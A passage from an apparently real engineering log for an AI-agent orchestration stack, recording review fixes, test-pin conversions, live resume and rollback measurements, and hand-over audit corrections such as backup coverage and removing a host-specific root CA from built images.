| 2 | P1 — the call id is `run-label-provider`: the same step called again writes the same `execution.json`; the broker is not told the attempt; the adapter's refresh retry keeps only `attempts=2` | **holds**, all three. Reproduced by the reviewer: 100 and 200 tokens left one record of 200 | `agent_task.py` names a second call of a label `-r2`, `-r3` … (decided after the door, so the process that makes the call names it); `broker_dispatch` → `broker` → `profile_runner` carry `attempt` into the runner's environment; the refresh retry keeps the first attempt's `result.a1.json`, sums both attempts' tokens and wall time, and records `attempt_outcomes` |
| 3 | P2 — the recorder keeps the first mention of an execution, so a partial `execute` hides the whole evidence record, and a reader meets a `KeyError` | **holds** (`executions_of`, dedupe by first) | one record per id: every source normalized, a later (fuller) source fills what an earlier one left empty, the evidence directory last; measurements merge; the receipt's lane name is kept |
| 4 | P2 — a resumed run reads as `finished` with the earlier failure; a resume does not restore the parent | **holds** (`runevents.read` never reset; `cmd_resume` env without the parent) | `workflow_started`, or a step starting after the log ended, opens a new segment: end, error, output, termination cleared, `segment` counted; `cmd_resume` sets `AGENTSTACK_PARENT_RUN` from the meta |
| 5 | P2 — a collection that fails leaves an earlier login's observation for the router | **holds**: `collect()` wrote into a directory it did not empty. The valid reuse is a different thing (`collect_obs.py kept`, beside the login, within the window) and is untouched | `collect()` empties the observation directory first |
| 6 | P2 — the command the panel shows does not run as printed; an empty login object stops the render; fixed ports; the install example cannot run | **holds**, each: `text=from the parent` unquoted; `login: {}` is true in JavaScript; `127.0.0.1:5000` and `localhost:3000` written in; `r1` is shorter than the rule allows and the package was never declared | values shell-quoted and placeholders quoted and named; the login line stands on its own and `{}` is no login; the consoles' addresses come from the ops API; a failed approvals read is said beside the table, not in its place; the install example declares the package and uses a run id the rule accepts |

**Measured.** Each fix has a model-free reproduction in review_controls (`review3_controls`, 24
pins): the id sequence `plain → -r2 → -r3` and `-a2 → -a2-r2` on a temporary evidence root; a
partial `execute` merged with its evidence (300 tokens, `model_served`, every field present); a
synthetic log with a failure then a new step (not ended, no stale output, `segment` 1) and then
its own end; a stale observation file gone after a collection that failed; and text pins for the
rollback, the broker path, the hub and the docs. review_controls 166/166, static on this runner,
the cold start for the rest: **run 66** (ef49539) green, and **run 71** (acd1f6f) green with every round of
this branch on it. What this level cannot say: a resumed run on the
instance reading as going while it goes (a resume with a live process), and a rollback to
`pre-202610` on an instance whose volume has no `.local` — the second is the operator's to run
when a rollback is wanted, and the first falls out of the next resume.

**What the review got right about §76.** The sentence "a release recorded before this still
rolls back: its `toolchain.tar.gz` is named and left alone, the kept images carry the same tools"
was reasoning from the image and not from the volume that masks it. It is corrected by the fix
above and stands in §76 as written, with this note.

**Not done here, and why.** The review's fourth recommendation — run the three external packages
on the new contract (long runs, parent/child and resume, repeat and aggregation) — is the
packages' authors' measurement (trading#2, devflow#1) and needs their repositories to move; the
stack's side of it is this section. Its remark that some controls check source text rather than
behaviour is fair: the reproductions above are behaviour where a behaviour exists without a model,
and text where the behaviour is a shell script against a Docker volume.

## 80. One fact, one place: providers, addresses, paths (review 3, "변경 용이성", 2026-10-03)

The third review left this axis as "improving", naming three facts written in more than one
place: the provider list, the default in-network addresses, and the stack's own paths. Counted
before changing anything:

| fact | where it was written | now |
|---|---|---|
| the three providers | `cfg.py KNOWN_PROVIDERS`, `ops/server.py PROVIDERS`, a tuple in `login_helper.py`, and the module list under `stack/adapter/providers/` | `settings.PROVIDERS` (provider → routes); `cfg.py` validates against it, `login_helper.py` reads it, the ops API reads the provider modules that exist; a control holds the table equal to the module list |
| `http://api:8000`, `console/mcp/v1`, `broker:8791`, `egress:8888`, `mlflow:5000` | `settings.DEFAULT_RUNTIME` and, as fallbacks or literals, `run-agent.mjs` (3), `broker.py` (2), `broker_dispatch.py`, `mcp_list.py`, `mcp_call.py`, `approver.py`, `bootstrap_preloop.py`, `capabilities.py`, `collect_obs.py`, `pcheck.sh`, and nine probes in `up.sh` | `settings.url(section, key)` — the generated settings or the one default table (`broker` added to it); the adapter reads `runtime.json` or refuses with "run cfg.py generate" instead of running on a second copy of the defaults; `up.sh` reads the four addresses it probes once from the agent. `preloop-api:8000` in `up.sh` stays: the admin side's name for Preloop's api on its own network, a different fact |
| `/opt/venv/bin/python` (93 sites) and `/work/stack/...` (157) | every module that starts another, five scripts, the package workflows | Python: `sys.executable` (or the package's `POC_PY`) and `__file__`/`settings.STACK` — no module names the interpreter or another module by an absolute path; scripts: `PY_IN_AGENT` once each (`up.sh` 17 → 1, `verify.sh` 6 → 1, `down.sh` 3 → 1, `packages.sh` 2 → 1); `ops/server.py` names the stack's mount once. The package workflows keep `${POC_PY:-/opt/venv/bin/python}`: that line is the package contract (docs/packages.md), not a copy |

**Measured as absence.** `ease_controls` (12 pins): the table equals the module list; no second
provider list in the Python; no in-network address on a code line outside `settings.py` across
stack/, the adapter and `up.sh`; no interpreter path in a Python module; no module naming another
by `/work/stack/...`; one `PY_IN_AGENT` per script; one `STACK` in the ops API. review_controls
179/179 and static 13/13 on this runner; the cold start for what runs: **run 71** (acd1f6f) green — after
run 67 found seven of `up.sh`'s container commands holding `$PY_IN_AGENT` inside single quotes,
where it does not expand (the role-egress plan and grok posture answered nothing, trial_controls
then found no role `.allow` files; spliced in as `"$PY_IN_AGENT"'…'`), and run 69 found four
trial pins still reading the old text of `ops/server.py` and `up.sh`.

## 81. The first-use check: the command a person copies is the one that runs (review 3, 2026-10-03)

The review's third recommendation: a check that the install document and the panel's commands
actually run, because in a command-first product that is the first-use experience. §79 fixed the
four commands that did not; this makes the panel's one a measurement rather than a reading.

**One builder.** The command the panel shows was assembled in the page from the API's input
list, so its quoting was the page's and nothing ran it. It is built once now, in
`run_workflow.py` (`workflows --detail`, field `command`): `scripts/cycle.sh <workflow> {profile}
key=value…` with every value `shlex.quote`d, a required input with no default as a quoted,
named placeholder (`text='<text>'`), and `{profile}` for the panel's one choice. The page puts
the chosen profile in and shows that string; it keeps no builder of its own.

**One run.** `verify.sh --level stack` asks the API for hello-lane's command, puts
`research-default` in the way the page does, and runs the string from the checkout exactly as a
person would paste it — `bash -c` on the host, through `scripts/cycle.sh` into `cycle.py` — then
requires the cycle it started to complete (`run_workflow.py show <ui>` → `completed_ok`). The
string carries `text='from the parent'`: the default with a space that reached the parser as
`text=from` before §79.

**What the check does not cover, said plainly.** `install.md`'s block declares a remote package
and installs it; on a cold start there is no remote package to fetch and hello-lane, being
`from: local`, cannot be declared a second time without becoming a contested name. The block's
commands are pinned to exist (`packages.sh install`, `cycle.sh`, `run_workflow.py start`) and its
run id to pass the rule (§79); running the block as written needs a package repository the stack
does not carry. Browser rendering of the page is not measured either: the page's script is parsed
by node at the static level, and what it renders is the API's string, which the stack level runs.

Along the way: `packages.py` related a workflow's path to the literal `/work` and `described()`
opened `/work/<rel>`; both read the configured root now (`settings.ROOT`, `AGENTSTACK_ROOT`), which
is what let this check run on the host at all and removed two more copies of a path (§80).

**Measured.** firstuse_controls (5 pins): every offered workflow has a command and each parses as
a shell would; hello-lane's carries its default with the space intact after parsing; a placeholder
is quoted and named; the page shows the API's string; the stack level runs it and requires the
cycle to complete. review_controls 184/184 and static 13/13 here; **run 70** (3cc714c) and **run 71** (acd1f6f): the
panel's command ran as printed and the cycle completed (`cyc-20261003-092442`), stack 24/24 on
run 71.

**Found by the check on its first run (cold-start run 68).** `scripts/cycle.sh hello-lane
research-default text='hello from a package' → bash: scripts/cycle.sh: Permission denied`. Fifteen
of the stack's shell scripts — `up.sh`, `down.sh`, `install.sh`, `release.sh`, `cycle.sh` among
them — were in git as mode 644: every document says `scripts/up.sh`, and on a fresh clone that
line does not run until someone types `bash` in front of it or `chmod +x`. Every operator so far
had, which is why nothing said so. The modes are 755 in git now. This is what the check is for:
a documented command that a person copies has to run as printed, and reading the scripts could
not have found it.

## 82. What the controls pin: behaviour, or a file's text (review 3, "검증 체계", 2026-10-03)

The review's remark: "some checks confirm that a string is in the source rather than that the
behaviour holds." Fair, and until now unmeasured. `stack/pin_kinds.py` reads the two control
suites and counts, per check, whether its condition reads a file of this repository (a module, a
script, a page, a document) or exercises a behaviour. A file the control wrote itself under a
temporary directory is behaviour; a condition made only of `not in` tests is an **absence** pin,
which is the kind that is right as text (a button that must not exist, an endpoint that is gone).

| suite | checks | behaviour | source-text | absence |
|---|---|---|---|---|
| review_controls, before | 167 | 111 | 53 | 3 |
| review_controls, after | 170 | 116 | **51** | 3 |
| trial_controls | 433 | 228 | 193 | 12 |

(The first version of the counter was wrong by eight: it treated a variable named `c` or `doc` as
a file's text wherever the name appeared, because another function had bound the same name to
one. Scoped per function, the numbers above.)

**Turned into behaviour here**, where a function-level reproduction existed: "the inputs reach
the run's argv" now runs `cycle.run` on a temporary ops directory with the runner replaced by one
that records its argv (`text=a b` arrives whole, the id and workflow in their places); "the seed
happens before the CLI is asked" now runs `onboard()` with the Preloop CLI replaced by one that
notes, at the moment it is asked, whether each vendor's file is there (both are).

**What stays text, by kind.** Of review_controls' 51: the panel's decisions (no start, no
precheck, resume and apply as commands — 6), documents and the contract (what update-day.md,
the runbook, install.md, CONTRACT.md must say — 7), the Dockerfile, release.sh, up.sh, drift.sh
(what a shell script or an image build does needs Docker or a registry — 16), the hub page
(what a browser renders — 5), and pins on the shape of Python or JavaScript source where the
behaviour runs only with a model, a container or a second process (the door's `execv`, the
broker path, the adapter's retry, a resumed run's environment — 17). trial_controls' 193 are
of the same kinds and run only inside the agent container; this host cannot run that suite
(measured: it reaches for the stack and stops), so its conversions are a cold-start-measured
job for the next rounds, one group at a time.

**The ratchet.** `pinkind_controls`: review_controls' source-text pins ≤ 51, trial_controls' ≤
193, behaviour the majority of review_controls. The bound moves down with each conversion and
up only with a sentence here. `verify.sh --level static` prints the counts on every run; the cold
start carried the ratchet on **run 71** (review_controls 187/187 in the agent).

## 83. trial_controls: the first text pins turned into behaviour (2026-10-03)

§82's ratchet, moved for the first time. Eight of trial_controls' source-text pins are behaviour
checks now, each a function run against a fake of the thing it talks to and its answer read back;
193 → **185** of 434 (one check added). This host cannot run the suite, so each converted block was
run here on its own through the suite's own `load()` and `check()`, and the cold start runs the
whole suite.

| was text | is now |
|---|---|
| "a decision reached without a model call is not recorded as NOT_RUN", "its evidence is kept with it" (`'NO_EXECUTION" if decided else "HOLD"' in rec`) | `record.record()` against an MLflow that is a dict — `call` and `put_artifact` replaced — for a payload with a decision and no execution, then for a HOLD: the tags read `NO_EXECUTION`/`PASS` with `evidence_items 2`, then `HOLD`/`NOT_RUN` with none. A third check came with it (the HOLD) |
| "asking for the plan never writes the map" (`"assignment(persist=False)" in …`) | `role_egress.plan()` on a temporary generated directory leaves no `role-uids.json`; `assignment(persist=True)` writes it when roles are declared |
| "the panel gets it from the one answer it already asks for" ×2 (`'"needs_env": needs.get(' in …`, `'"runbook": runbooks.get(' in …`) | `run_workflow.described()`: hello-lane's row carries `needs_env` as a list and `command`; every row carries `runbook` |
| "a package's declared capabilities are read by the runner" | `packages.requires_of("hello-lane")` answers `[]` |
| "a run id used twice is an answer, not a traceback" (`"has been used already" in rw_src`) | `cmd_start` on a temporary runs directory whose id already has a run, the capability probe answering for this call: exit 2 and the JSON error, no traceback |
| "the runner asks the loader", "a package may not take a built-in's name" | `run_workflow.known()` ⊇ `packages.workflows()`, carries hello-lane, and every built-in keeps its own entry |

**Left as text in these groups, and why.** The step scripts (`agent_task.py`: `produced`,
`produced_stale`, the login-owner refusal) run only as a Conductor step with a model; the Dockerfile,
`up.sh`, `down.sh`, `install.sh`, the gitignore, tinyproxy's config and the hub are not Python; the
documents are documents. The next groups to take are `controls_approval_boundary` (12) and
`controls_resume` (12), where `approvals.py` and `runstate.py` have functions.

**Measured.** The eight blocks on this host, 11/11 checks (the HOLD check new); pin_kinds
review 51/170, trial 185/434; the ratchet bound lowered to 185; review_controls 187/187 and static
13/13 here; the cold start: run 74 red on the leak below, **run 75 green** with it undone.

**What run 74 found (the first cold start of this section; the fix's commit message says 72 — wrong number, same run).** Three checks in a later group,
`controls_composition`, answered `[]` where `capabilities.missing()` should have named `record`,
`tool_rights`, `egress`. The used-id block above replaces `capabilities.probe` and `missing` so the
runner's question is the id and not the stack — and `capabilities` is one module in `sys.modules`,
shared by every loader of `run_workflow`, so the replacement outlived its block and the next group
asked a stub. Running each block alone on this host could not see it; the suite in one process did.
The replacement is saved and restored in a `finally` now, and the leak reproduces here with the two
blocks run in one process: three FAIL before, five ok after. A behaviour check that patches a shared
module is a thing the suite must undo — written down here as the rule for the next conversions.

**Second round, the same PR: `controls_resume` and `controls_approval_boundary`.** 185 → **179**
of 438 (four checks added). The groups' leftovers are the hub, `up.sh`, `down.sh`, nginx's table,
compose and `docs/commands.md` — not Python, so text they stay.

| was text | is now |
|---|---|
| "a run is started with the dashboard that makes a graceful stop possible", "the reason is written down" (`'"--web", "--web-port", "0"' in src`) | `run_workflow.conductor_argv()` — the argv-building lines of `cmd_start` are a function now — answers `--web --web-port 0 --no-interactive`, the workflow's file, and the profile and inputs as `-i` pairs; the reason is its docstring |
| "a run comes back when the workflow ends, not when the process does", "our own tidy-up is not reported as the run failing" (`"proc.terminate()" in src`, `"Reporting -15 as the exit" in src`) | `run_conductor()` with a child standing in for Conductor: it appends `workflow_completed` to the run's log and then sleeps, as the dashboard does. The launcher returns 0 within the bound, and the child is gone |
| "a resume looks only past what was already in the log" (`"from_byte" in src`) | a second child beside the first, writing nothing, on a log that already ends with a stop: the launcher is still waiting when the first has returned; it returns once the child is sent away |
| "continuing a run is a command" (`"def cmd_resume(" in src`) | `cmd_resume()` on a runs directory of its own: an id that is not there answers `no such run`, exit 1; a finished run with no checkpoint says `no checkpoint`, exit 1 (the doc half of the pin stays text) |
| "the API has no resume endpoint" (`'/resume", p)' not in ops_server`) | the panel's handler called in-process (`ops_post()`: `ops/server.py` loaded once, `jlocal`/`jexec`/`dexec` replaced by recorders, `do_POST` on a handler built without a socket): `POST /api/runs/<id>/resume` answers 404 `no such route` |
| "the panel runs the decision itself, not in the agent" (`'jlocal([f"{STACK}/approvals.py", "decide"' in ops_server`) | the same handler on `POST /api/approvals/<uuid>` with `approve` and a comment: 200, one call recorded through `jlocal` — `approvals.py decide <uuid> approve <comment>` — and none through `docker exec`; a decision that is neither `approve` nor `decline` is 400 with no call at all |

One lesson from writing the resume checks: the first draft gave the run a two-letter id and read
`no such run` back, because the id rule is six characters or more — the check was pinned against
the rule before it was pinned against the function.

**Measured, second round.** The two groups and `controls_composition` on this host in one process,
80/80 (the canary for the leak above among them); the run_conductor pair costs ~12 s; pin_kinds
trial 179/438, review 51/170; the ratchet bound lowered to 179; **cold-start run 76 green**: trial_controls 505/505 in the container, review 187/187, stack 24/24, the first-use and child-run checks among them.

**Third round (the PR after #42): what was left with Python behind it.** 179 → **167** of 440
(two checks added). Three groups, one idea each.

| was text | is now |
|---|---|
| `principals.py` — "an identity no declaration names is reported by apply", "marked in the listing", "never removed" (`'"undeclared": orphans' in pr`, `"UNDECLARED" in pr`, `'api("DELETE"' not in pr`) | `cmd_apply()` and `cmd_list()` against a Preloop that is a dict (`fake_preloop()`: agents, credentials, governance, every call recorded; `api()` replaced), one identity declared and one not: apply answers `undeclared: ["left-behind"]` with "yours to do"; list marks that line `UNDECLARED` and not the other; no `DELETE` was called and both identities are still there |
| "a credential is asked about, never assumed from this process's environment", "a name Preloop would refuse is not offered twice", "a credential already issued is not lost to a failed chmod" (`"def has_credential(" in src`, `"def credential_name(" in src`, `"except OSError" in src`) | apply with the variable in this process's environment and nothing in Preloop or the env file, `os.chmod` raising (the shared module, restored in a `finally`): exit 0, one `credential minted`, the token line in the file it wrote. Then Preloop has it and the file names it, the environment does not: no change, no restart. `credential_name()` answers `-2` when the base name is taken by a revoked one |
| `ops_health.py` — "identities that accumulate are reported, not deleted", "a declared role principal is not counted" (strings) | `risks()` with the agent list replaced — two of `Claude Code`, two `Role: hello-writer`: one risk, detail `Claude Code: 2`, the deleting left to the operator |
| `collect_obs.py` — "a reading with numbers and no vendor timestamp is dated by when it was taken", "no numbers stays undated" (strings) | `codexbar_claude_direct()` with `codexbar` a script on PATH printing a file, the login directory a temporary one: numbers without `updatedAt` → an ISO timestamp and a `session` window; no numbers → `observed_at None`; a vendor timestamp wins (new check) |
| `ops/server.py` — "the panel asks the runner rather than keeping a second list" (`'run_workflow.py", "workflows"' in ops_server`) | `GET /api/workflows` through `ops_call()` (`ops_post` generalised): 200, one exec recorded — `run_workflow.py workflows --detail` in the agent (the "no list of its own" half stays an absence pin) |
| "the principals a bring-up applies include the packages'" (`"packages.principals()" in pr`) | `principals.declared()` ⊇ `packages.principals()` names, `hello-writer` among them |

What stays text after this round, across the suite: shell (`up.sh`, `down.sh`, `install.sh`,
`packages.sh`), the hub, nginx and tinyproxy configs, compose, the Dockerfile, `run-agent.mjs`,
the documents, and the step scripts that run only under Conductor. That is the floor this method
reaches without a second kind of harness (a shell harness, a browser), and the count is now a
number the ratchet holds rather than an estimate.

**Measured, third round.** The three groups and `controls_composition` on this host in one
process, 145/145; pin_kinds trial 167/440, review 51/170; the ratchet bound lowered to 167;
review_controls 187/187 and static 13/13 here; **cold-start run 78 green**: trial_controls 507/507 in the container, review 187/187, stack 24/24.

## 84. The live instance after review 3: resume continues, rollback refused by its own check (2026-10-03)

The two measurements §79 could not take on this host, taken by the operator on the live instance
(55d81da, after `release.sh update --to 55d81da` recorded release `20261003-105047-be4ed57`, ALL
CHECKS PASSED; a backup `agentstack-backup-20261003-104632`, 985 MB, taken first).

**Resume: it continues from the checkpoint, and only the unfinished step runs again.**

```
docker exec cadp278-agent /opt/venv/bin/python /work/stack/run_workflow.py stop   r79-resume-195851
docker exec cadp278-agent /opt/venv/bin/python /work/stack/run_workflow.py resume r79-resume-195851
```

| | |
|---|---|
| stopped when | novel-a in its author step (architect done) — `Stopped workflow 'novel-a' (PID 1801)`, rc 0 |
| checkpoint | left: `checkpoints/novel-a-20261003-105942-244edb45.json`, `current_agent = author` |
| after resume | `finished`, `completed_ok: true`, `segment: 2`, `resumed_from` the checkpoint, exit 0, decision PASS |
| steps run | route roles stage architect author author freeze reviews triage record_pass done_pass |
| model calls | architect-codex once (before the stop); author-claude (interrupted); **author-claude-r2** (after the resume); then story, history, cold |

The architect did not run again. The second author call carries its own id, `-r2`, and the first
call's record is intact: §79's evidence-directory fix, measured. `segment: 2` is §79's event-log
segmentation, measured.

A side finding: `cmd_stop`'s docstring still said a stop leaves no checkpoint (2 of 51 runs, from
before §23). The runbook said the opposite and the runbook was right — §23's `--web` is what made
the graceful cancel write one. The docstring now says what was measured.

**Rollback to pre-202610: refused by the check §79 added, with the toolchain present in the archive.**

```
scripts/release.sh rollback --to pre-202610     # exit 1
  == rolling back to pre-202610 (workspace 2485a20)
  the archive has no claude
  release: the release's toolchain archive does not restore a usable toolchain — nothing was changed
```

The archive holds claude (`.local/share/claude/versions/2.1.278`), but its `bin/claude` is an
**absolute symlink**, `-> /home/agent/.local/share/claude/versions/2.1.278` — claude's installer
writes one. The check unpacks the archive into the volume as `.local.new` and tests
`[ -e /vol/.local.new/bin/claude ]` in an alpine container; `-e` follows the link to
`/home/agent/...`, which does not exist in that container, and the tool is called missing. So no
release from before #34 could be rolled back to — the one case the check exists for. The second
finding: the refusal said "nothing was changed" and left the 656 MB `.local.new` in the volume
(the operator removed it). The live instance stayed at 55d81da, 19 containers up.

**Fixed.** The check is a function, `toolchain_usable`, kept as a string in release.sh so the same
text runs in the container and in a control: a symlink's target is read, an absolute one under
`/home/agent/.local/` is looked for under the unpacked archive, a relative one next to the link;
a target that is really missing is still refused, naming the tool. On refusal the unpacked copy is
removed before the message. review_controls runs the function on a fixture shaped like
pre-202610's archive (claude an absolute link, dangling on the host; preloop a relative one;
conductor a file): it verifies, and with the claude or the preloop target removed it is refused
naming that tool. The "went down and came back" measurement is still to take, on the live
instance, with this fix — a rollback is the one thing the cold start cannot rehearse (it has no
pre-#34 release).

**A recurring condition, now an issue.** The resume measurement first held with `claude stale:
27152s old`: the route login's OAuth token had expired, CodexBar cannot refresh it, and the
reading aged past the bound — the third time in two days (§73 was the first). Every run that
needs claude holds until a person signs in again on the panel. #44 holds the mechanism, the
measurements and the candidate fixes; nothing was changed for it here.

**Measured.** Resume: the table above, on the live instance. Rollback: refused as quoted; the fix's
function on this host through review_controls (verifies / refuses naming claude / refuses naming
preloop); review_controls 189/189, static 13/13 here; **cold-start run 80 green** (review 189/189 in the container, among them the two archive-check cases). The rollback itself: the live instance, after this merges.

**Rolled back, and back again (the operator, after #45 merged).** First the fix onto the live
instance, then the rollback:

```
scripts/release.sh update --to 7a57911        # release 20261003-112138-55d81da recorded, ALL CHECKS PASSED
scripts/release.sh rollback --to pre-202610   # exit 0
  toolchain archive    from before #34 — unpacked and verified; swapped into /home/agent/.local below
  verified             images and the archives
  workspace            2485a20 · images ← :rel-pre-202610 (agent, mlflow, fsmcp, egress, ops, hub)
  ALL CHECKS PASSED
  claude 2.1.278 · conductor v0.1.37 · preloop_cli 0.15.0 · codex 0.155.1 · grok 1.0.40
  rolled back to pre-202610
```

claude, conductor and preloop ran from the volume's `/home/agent/.local/bin`; no `.local.old` or
`.local.new` was left. **The rollback to a release from before #34 works** — §79's P1, measured.

Coming back took three attempts, and the second did harm:

| | script that ran | result |
|---|---|---|
| `update --to 7a57911` | the workspace's, now 2485a20's | refused: tools differ, "re-run with --replace-toolchain"; nothing touched |
| `update --to 7a57911 --replace-toolchain` | 2485a20's | moved the workspace to 7a57911, then "could not stage the new toolchain; nothing was replaced" — it looks for the tools in the new image's `/home/agent/.local`, and since #34 they are in `/opt`. The instance was left as **new code on old images and old tools** (claude 2.1.278), and a release `20261003-112907-7a57911` was recorded in that state: its name says 7a57911, its images and tools are pre-202610's |
| `update --to 7a57911` | the workspace's, now 7a57911's | four `will change` lines (claude 2.1.278→2.1.287, conductor 0.1.37→0.1.41, codex 0.155.1→0.160.0, grok 1.0.40→1.0.46), ALL CHECKS PASSED, tools from `/opt` again |

The cause is the self-copy at the top of release.sh: an `update` runs the script of the revision
*in the workspace*, and after a rollback that is the old release's script, which cannot know a
layout that came after it. Nothing in this repository can change what 2485a20's script does. What
the current script can do, and does now: when a rollback restores a pre-#34 release, it says so at
the end and prints the way back — the target revision's own script, run against this workspace:

```
git -C <workspace> show <rev>:scripts/release.sh > /tmp/release.sh
RELEASE_SH_HOME=<workspace> bash /tmp/release.sh update --to <rev>
```

docs/update-day.md carries the same procedure. The third attempt above is exactly this path, by
accident: the second attempt had already put the new script into the workspace. Not decided here:
whether `update` should always run the *target* revision's script (the new installer installs),
which would make this class of failure impossible from the next revision on; it changes who is
trusted with the update, and is the operator's call.

Two things the operator should know about the live instance: the release
`20261003-112907-7a57911` is mislabelled (old images under a new revision name) and a rollback to
it would recreate the mixed state — removing it from the releases directory is the simplest
answer; and the volume carries the unpacked old toolchain again (`/home/agent/.local`, 656 MB),
which `up.sh` reports on every bring-up and which goes only with the stack down.

The instance is at 7a57911, ALL CHECKS PASSED, tools from `/opt`. `verify --level full` 23/24:
trial_controls 511/511, review_controls 189/189, auto PASS; novel-a held on claude's session
window at 81 % ≥ 80 % — the day's measurements used it — and router_controls skipped for the same
reason. That hold is the router doing its job, not a defect.

**Candidate images left behind.** Going through what the day had left on the host, the operator
found five `governed-runtime:cand-*` images, one per update. `update` builds the target revision
in a throw-away worktree under that tag for one purpose, the `will change` comparison, and the
image the stack then runs is compose's own build; nothing referenced the candidate afterwards and
`cleanup_all` removed the worktree and the script copy but not the image. It removes the image
now, on every exit path. The five already there are the operator's to remove by hand; whether new
ones stop appearing is measured after the next live update (`docker image ls | grep cand-`), not
by the cold start, which has no update path.

**Measured, this addendum.** The rollback and the way back: the operator's outputs above, on the live instance. The printed note and the docs: review_controls 189/189, static 13/13 here; **cold-start run 82 green** on 1d7e042.

## 85. Asking the package authors to move, and the way their findings come back (2026-10-03)

The stack is at ec628d4; the two external packages were last measured at 2485a20 (the package
matrix, agent-stack-trading#2, agent-stack-devflow#1), and the third review's fourth
recommendation — run them on the new contract — is theirs to do. Before asking, what an author
would need was checked against what the documents give.

**What they had.** docs/packages.md is the contract: layout, the six rules a step keeps, the
execution record, `requires`, binding, state, child runs, retries, credentials, identities,
controls, the done-checklist. CONTRACT.md is the line between platform and workflow and the
own-runtime contract. The two issues list, per package, what each still does its own way as of
2485a20.

**What they did not have, and have now.**
- *What changed since the revision they were measured against.* The record (§70–§84) is the
  operator's, 1,500 lines, and not written for an author. docs/packages.md has a section "Moving a
  package to a newer stack": the four steps (read the changes, change and raise the floor, run,
  report) and the list of changes for packages by revision, newest first, each naming its §. The
  entries that change something for a package: the resume contract (§84: a stopped step is
  re-entered from its start, the repeated call gets `-r2`); evidence-directory suffixes and the
  two environment variables (§79); tools on the PATH from `/opt`, `~/.local/bin` gone (#34 —
  trading's harness has a `preloop` fallback there); commands instead of buttons (#24).
- *A way to report.* No issue template existed. `.github/ISSUE_TEMPLATE/package-feedback.md`:
  package and commit, stack revision, the command, what happened, what was expected, which
  document was open, and where the author thinks it belongs (stack, page or package). One
  finding per issue, label `package-feedback`. The page says what counts: a sentence worked out
  from the source is a defect of the page; a thing built around is a candidate for the stack.
- *The resume contract for a step* was not on the contract page at all before §84 measured it.

**Not changed.** The two package issues stand; the comment on each names the current revision,
the new section and the template. What the authors change in their packages, and whether they
take `step` and the one door, is theirs (trading#2 and devflow#1 already say what and in which
order).

**After their findings.** The stack-side issues that wait on what the authors report: #18 (HTTP
remote mechanics, common to trading and devflow, deferred by size), #44 (the claude token
expiry hold, which every package with a claude role meets), #48 (which script performs an
update). #19 waits on CADP, not on them.

**Measured.** The page's examples still parse and load (`doc_examples.py`), review_controls
189/189 and static 13/13 here; the cold start — run number below.

## 86. The hand-over audit, and the first fixes from it (2026-10-04)

The maintainer changed without a hand-over. What a new one finds reading this tree is
docs/record/HANDOVER-AUDIT-2026-10-03.md: what lives only on the previous machine, the defects
verified by reading, the drift between the pages and the code. This section is the first round of
fixes, each one a thing that would have cost an operator a run, a backup or a rollback.

**`up.sh --check` changes nothing — now true.** The runbook, verify.sh and update-day.md all said
it; `scripts/up.sh` guarded only the build, the policy scan and the grok posture. Unguarded in
check mode: `principals.py apply` (a write to Preloop) and, when it minted a credential, the
force-recreate of the agent and the broker — under a run in flight, which leaves no checkpoint;
the guard's nginx reload; and the per-role egress block, which ended in `docker restart
<stack>-egress`, the agent's only route to the providers. That block runs whenever a declared role
has `egress:` hosts, and the platform's own `egress-probe` (config/principals.yaml) always has one
— so **every `--check` restarted the egress proxy**, under whatever model call was going. All
three are under `MODE != --check` now. What a check still writes: `evidence/checks/last.json` and
`evidence/ops/host-state.json`, which are the check's own result.

**A cycle that could not start was a cycle that ran.** `cycle.py` treated only exit 3 (a capability
missing) as a refusal. `run_workflow.py start` answers **2** for a workflow that does not exist, a
bad profile or id, a bad input, a reused id — and that fell through to `soak_outcome.py`, which
found no run and wrote `{"state": null}` to `evidence/ops/cycles.jsonl` as an outcome, exit 0. A
scheduler that misnamed its workflow saw success forever, and `ops_health.py` counted it as ran.
Both codes are refusals now, recorded with `rc`; a runner that itself fails is recorded as
`failed` and exits 1. And the default workflow `trading-b` — in `cycle.py`, `soak.sh` and the
README's example — left this repository with its package: a scheduler that names nothing is now
told the usage, exit 2, instead of starting a workflow the loader does not offer.

**`trajectory.py` refused the runs it exists for.** `of_run` treated any `error` on the run's view
as "no such run" and printed only the string. `runevents.py` fills `error` for every step that
fails and the view fills it for an interrupted run — so the run reading-a-run.md sends you to
`trajectory.py` for first ("when a step failed: 1.") was exactly the run it would not assemble,
and `suite.py read` dropped such runs from every count. Only a missing run is refused now; a
run's error is a field (`run_error`) beside its steps, calls and assertions.

**Three smaller ones, read not measured.** `run_workflow.described()` left `logins` and `runbooks`
unbound when the package tree half-read, so the panel's workflow tab answered a NameError (the
except branch binds all four now). `steps/route.py` and `steps/admit_models.py` wrote their
evidence to a literal `/work/evidence/p281/` while every reader and the cleanup use the settings'
`evidence_root` (both go through `step.evidence_dir()` now). The broker's job token lived a fixed
3600 s — exactly long-task's `timeout_ms` — and was born before the runner was contacted, so the
last seconds of an hour-long brokered call answered 401 on MCP (the token lives the job's
`timeout_s` plus 60 now).

**`backup.sh` failed on a default install, and did not hold the secrets.** It required the
observer's `quota-home` volume, which exists only on an instance that ran `up.sh --observer`
(off by default since #16), and the `/research` mount, which only the research-r package has; a
`--composition no-record` instance could not be backed up for lack of MLflow either. And nothing
under `docker/` was a member — `preloop-owner.env`, the only copy of the console account `up.sh`
claimed the instance with, `principals.env`, `operator.env`, `package.env` — while install.md
calls those the secrets and the runbook calls the backup the only copy of the account. Now:
quota-home, MLflow and research are members when the composition has them and reported as not
members when it does not; `docker/*.env` is one member, `preloop-owner.env` required (a backup
without the account's password is the case `--allow-missing` exists for); `restore.sh` puts the
env files back at 0600 and creates no volume the backup does not hold. **Not measured here**:
this host has no Docker. One backup and one `--verify-only` restore on the live instance is the
measurement, and it is the operator's.

**One host's root CA was in every image.** `docker/ca/kaspersky-root.crt` — the first host's
endpoint-security product's *personal* root, needed there because it intercepts `claude.ai` and
the build's `curl` failed without it (FINDINGS-278 F10, which calls it "not generalizable") —
was tracked, and `agent.Dockerfile` installed it into the trust store of every agent image this
tree built, the cold-start runner's included. §4's table called it "deliberately unversioned";
it was versioned. The file is gone from git and `docker/ca/*.crt` is ignored; the Dockerfile
copies the directory whether or not it holds a root, so an ordinary host builds without one and
`release.sh update` copies the workspace's into the candidate worktree. **For the first host**:
after pulling this, put the root back as `docker/ca/<name>.crt` before the next build, or the
build fails with exit 60 again (unless the product's exception from F10's addendum still holds).

**The pages, against the code.** README: compositions are `full | no-record | runtime` (not
`minimal`), arm64 is parameterized, the images are ~11 GB, the run example names a workflow the
